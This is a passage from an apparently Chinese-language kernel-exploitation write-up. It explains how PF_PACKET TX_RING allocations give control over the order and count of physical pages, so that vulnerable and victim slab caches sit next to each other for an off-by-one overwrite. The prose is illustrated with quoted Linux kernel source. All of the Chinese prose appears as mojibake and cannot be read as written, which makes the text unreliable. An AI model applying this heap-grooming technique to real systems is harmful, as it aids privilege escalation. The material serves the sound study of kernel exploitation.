<p><img   src="/images/79biltjNfACIZcP.gif"  alt="å·"></p>
<p>ä¸éš¾æƒ³åˆ°è¿™ä¸ªåˆ©ç”¨æ–¹å¼çš„åŸç†å°±æ˜¯ï¼šä»æ›´é«˜é˜¶ order æ‹†åˆ†æˆçš„ä¸¤ä»½ä½é˜¶ order çš„è¿ç»­å†…å­˜é¡µæ˜¯ç‰©ç†è¿ç»­çš„ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥ï¼š</p>
<ul>
<li>å‘ buddy system è¯·æ±‚ä¸¤ä»½è¿ç»­çš„å†…å­˜é¡µ</li>
<li>é‡Šæ”¾å…¶ä¸­ä¸€ä»½å†…å­˜é¡µï¼Œåˆ†é… <code>vulnerable kmem_cache</code> ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li>
<li>é‡Šæ”¾å¦ä¸€ä»½å†…å­˜é¡µï¼Œä½¿ç”¨ <code>victim kmem_cache</code> å †å–·ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li>
</ul>
<p>é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>vulnerable kmem_cache</code>çš„<code>off by null</code>æˆ–<code>off by one</code>å»ä¿®æ”¹åˆ°<code>victim kmem_cache</code>äº†ã€‚</p>
<h3 id="åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page"><a href="#åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page" class="headerlink" title="åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page"></a>åˆ†é…ä»»æ„æ•°é‡ä»»æ„å¤§å°page</h3><p>æ ¹æ®ä¸Šè¿°å†…å®¹æ¥çœ‹ï¼Œæˆ‘ä»¬éœ€è¦æ¶ˆè€—æ‰å°<code>order</code>çš„é¡µé¢æ‰èƒ½ç»§ç»­è¿›è¡Œï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯ä»¥ç”³è¯·æŒ‡å®š<code>order</code>çš„APIã€‚è¿™é‡Œé€‰æ‹©æ˜¯<a class="link"   target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html" >CVE-2017-7308<i class="fas fa-external-link-alt"></i></a>ä¸­çš„æ–¹æ³•ã€‚</p>
<p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª <code>protocol</code> ä¸º <code>PF_PACKET</code> çš„ socket ä¹‹åï¼Œå…ˆè°ƒç”¨ <code>setsockopt()</code> å°† <code>PACKET_VERSION</code> è®¾ä¸º <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>ï¼Œå†è°ƒç”¨ <code>setsockopt()</code> æäº¤ä¸€ä¸ª <code>PACKET_TX_RING</code> ï¼Œæ­¤æ—¶ä¾¿å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p>
<p><code>__sys_setsockopt</code>&#x3D;&gt;<code>sock-&gt;ops-&gt;setsockopt</code>&#x3D;&gt;<code>packet_setsockopt</code>&#x3D;&gt;<code>packet_set_ring</code>&#x3D;&gt;<code>alloc_pg_vec</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct pgv *<span class="title">alloc_pg_vec</span><span class="params">(struct tpacket_req *req, <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(struct pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°çš„æ˜¯è¿™é‡Œ<code>alloc_pg_vec</code>å‡½æ•°é€šè¿‡<code>alloc_one_pg_vec_page</code>å‡½æ•°ç”³è¯·bufferã€‚å¹¶ä¸”è¿™é‡Œç”³è¯·çš„æ•°é‡ä¸º<code>req-&gt;tp_block_nr</code>è€Œreqæ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œç”³è¯·çš„æ•°é‡æ˜¯å¯æ§çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">alloc_one_pg_vec_page</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *buffer;</span><br><span class="line">	<span class="keyword">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">	buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">	gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">	buffer = (<span class="keyword">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* complete and utter failure */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œ<code>alloc_one_pg_vec_page</code>å‡½æ•°ä½¿ç”¨<code>__get_free_pages</code>ç”³è¯·åˆ°pageã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">packet_setsockopt(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname, <span class="keyword">sockptr_t</span> optval,</span><br><span class="line">		  <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line">		<span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">	<span class="keyword">case</span> PACKET_ADD_MEMBERSHIP:</span><br><span class="line">	<span class="keyword">case</span> PACKET_DROP_MEMBERSHIP:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">packet_mreq_max</span> <span class="title">mreq</span>;</span></span><br><span class="line">		<span class="keyword">int</span> len = optlen;</span><br><span class="line">		<span class="built_in">memset</span>(&amp;mreq, <span class="number">0</span>, <span class="keyword">sizeof</span>(mreq));</span><br><span class="line">		<span class="keyword">if</span> (len &lt; <span class="keyword">sizeof</span>(struct packet_mreq))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (len &gt; <span class="keyword">sizeof</span>(mreq))</span><br><span class="line">			len = <span class="keyword">sizeof</span>(mreq);</span><br><span class="line">		<span class="keyword">if</span> (copy_from_sockptr(&amp;mreq, optval, len))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (len &lt; (mreq.mr_alen + offsetof(struct packet_mreq, mr_address)))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (optname == PACKET_ADD_MEMBERSHIP)</span><br><span class="line">			ret = packet_mc_add(sk, &amp;mreq);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			ret = packet_mc_drop(sk, &amp;mreq);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line">	<span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line">		<span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">		lock_sock(sk);</span><br><span class="line">		<span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V1:</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">			len = <span class="keyword">sizeof</span>(req_u.req);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">			ret = -EINVAL;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">						    optname == PACKET_TX_RING);</span><br><span class="line">		&#125;</span><br><span class="line">		release_sock(sk);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">      ... ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬çš„<code>optname</code>ä¸º<code>PACKET_TX_RING</code>æ—¶ä¼šè°ƒç”¨åˆ°<code>packet_set_ring</code>ï¼Œå› ä¸ºæ­¤æ—¶lençš„å…³ç³»ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®¾ç½®<code>po-&gt;tp_version</code>ä¸º<code>TPACKET_V1</code>&#x2F;<code>TPACKET_V2</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> PACKET_VERSION:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> val;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (optlen != <span class="keyword">sizeof</span>(val))</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (copy_from_sockptr(&amp;val, optval, <span class="keyword">sizeof</span>(val)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		<span class="keyword">switch</span> (val) &#123;</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V1:</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V2:</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		&#125;</span><br><span class="line">		lock_sock(sk);</span><br><span class="line">		<span class="keyword">if</span> (po-&gt;rx_ring.pg_vec || po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line">			ret = -EBUSY;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			po-&gt;tp_version = val;</span><br><span class="line">			ret = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		release_sock(sk);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>æƒ³è¦ä¿®æ”¹åˆ°<code>po-&gt;tp_version</code>éœ€è¦è¿›å…¥åˆ°è¿™ä¸ªcaseï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸¤æ¬¡è°ƒç”¨ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> *rx_owner_map = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> was_running, order = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_ring_buffer</span> *<span class="title">rb</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_head</span> *<span class="title">rb_queue</span>;</span></span><br><span class="line">	__be16 num;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="comment">/* Added to avoid minimal code churn */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> *<span class="title">req</span> =</span> &amp;req_u-&gt;req;</span><br><span class="line"></span><br><span class="line">	rb = tx_ring ? &amp;po-&gt;tx_ring : &amp;po-&gt;rx_ring;</span><br><span class="line">	rb_queue = tx_ring ? &amp;sk-&gt;sk_write_queue : &amp;sk-&gt;sk_receive_queue;</span><br><span class="line"></span><br><span class="line">	err = -EBUSY;</span><br><span class="line">	<span class="keyword">if</span> (!closing) &#123;</span><br><span class="line">		<span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">if</span> (packet_read_pending(rb))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> min_frame_size;</span><br><span class="line"></span><br><span class="line">		... ...</span><br><span class="line"></span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		order = get_order(req-&gt;tp_block_size);</span><br><span class="line">		pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">    ... ...</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">if</span> (closing || atomic_read(&amp;po-&gt;mapped) == <span class="number">0</span>) &#123;</span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line">		spin_lock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line">		swap(rb-&gt;pg_vec, pg_vec);</span><br><span class="line">		<span class="keyword">if</span> (po-&gt;tp_version &lt;= TPACKET_V2)</span><br><span class="line">			swap(rb-&gt;rx_owner_map, rx_owner_map);</span><br><span class="line">		rb-&gt;frame_max = (req-&gt;tp_frame_nr - <span class="number">1</span>);</span><br><span class="line">		rb-&gt;head = <span class="number">0</span>;</span><br><span class="line">		rb-&gt;frame_size = req-&gt;tp_frame_size;</span><br><span class="line">		spin_unlock_bh(&amp;rb_queue-&gt;lock);</span><br><span class="line"></span><br><span class="line">		swap(rb-&gt;pg_vec_order, order);</span><br><span class="line">		swap(rb-&gt;pg_vec_len, req-&gt;tp_block_nr);</span><br><span class="line"></span><br><span class="line">		rb-&gt;pg_vec_pages = req-&gt;tp_block_size/PAGE_SIZE;</span><br><span class="line">		po-&gt;prot_hook.func = (po-&gt;rx_ring.pg_vec) ?</span><br><span class="line">						tpacket_rcv : packet_rcv;</span><br><span class="line">		skb_queue_purge(rb_queue);</span><br><span class="line">		<span class="keyword">if</span> (atomic_read(&amp;po-&gt;mapped))</span><br><span class="line">			pr_err(<span class="string">&quot;packet_mmap: vma is busy: %d\n&quot;</span>,</span><br><span class="line">			       atomic_read(&amp;po-&gt;mapped));</span><br><span class="line">	&#125;</span><br><span class="line">  ... ...</span><br><span class="line">out_free_pg_vec:</span><br><span class="line">	<span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">		bitmap_free(rx_owner_map);</span><br><span class="line">		free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">	&#125;</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„orderæ˜¯ç”±<code>req-&gt;tp_block_size</code>ç¡®å®šçš„ï¼Œè€Œä¸”reqæ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç”³è¯·çš„pageçš„orderä¹Ÿæ˜¯å¯æ§çš„ã€‚å¹¶ä¸”éœ€è¦æ³¨æ„çš„æ˜¯åœ¨<code>if (closing || atomic_read(&amp;po-&gt;mapped) == 0)</code>è¿™ä¸ªæ¡ä»¶åˆ†æ”¯ä¸­ï¼Œä¼šäº¤æ¢<code>rb-&gt;pg_vec</code>ä¸­çš„å†…å®¹å’Œå½“å‰å‡½æ•°ä¸­å˜é‡<code>pg_vec</code>ä¸­çš„å†…å®¹ï¼Œæ‰€ä»¥åœ¨æœ€åä¸ä¼šæ‰§è¡Œåˆ°<code>free_pg_vec</code>å‡½æ•°ã€‚</p>
<h3 id="é‡Šæ”¾"><a href="#é‡Šæ”¾" class="headerlink" title="é‡Šæ”¾"></a>é‡Šæ”¾</h3><p>è¿™é‡Œçš„é‡Šæ”¾æµç¨‹å¾ˆç®€å•ï¼š<code>packet_release</code>&#x3D;&gt;<code>packet_set_ring</code>&#x3D;&gt;<code>free_pg_vec</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_pg_vec</span><span class="params">(struct pgv *pg_vec, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (likely(pg_vec[i].buffer)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (is_vmalloc_addr(pg_vec[i].buffer))</span><br><span class="line">				vfree(pg_vec[i].buffer);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				free_pages((<span class="keyword">unsigned</span> <span class="keyword">long</span>)pg_vec[i].buffer,</span><br><span class="line">					   order);</span><br><span class="line">			pg_vec[i].buffer = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	kfree(pg_vec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å°±æ˜¯å°†é‡Œé¢çš„å†…å®¹ç»™é‡Šæ”¾æ‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_release</span><span class="params">(struct socket *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_fanout</span> *<span class="title">f</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sk)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	... ...</span><br><span class="line"></span><br><span class="line">	lock_sock(sk);</span><br><span class="line">	<span class="keyword">if</span> (po-&gt;rx_ring.pg_vec) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">		packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (po-&gt;tx_ring.pg_vec) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(&amp;req_u, <span class="number">0</span>, <span class="keyword">sizeof</span>(req_u));</span><br><span class="line">		packet_set_ring(sk, &amp;req_u, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆå®¹æ˜“æ³¨æ„åˆ°çš„æ˜¯éƒ½è°ƒç”¨çš„<code>packet_set_ring</code>å‡½æ•°ï¼Œè€Œåœ¨<code>packet_release</code>å‡½æ•°ä¸­æ‰€ç»™çš„å‚æ•°ä¸­ç¬¬ä¸‰ä¸ªå‚æ•°ä¸º1ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">packet_set_ring</span><span class="params">(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">int</span> closing, <span class="keyword">int</span> tx_ring)</span></span></span><br></pre></td></tr></table></figure>

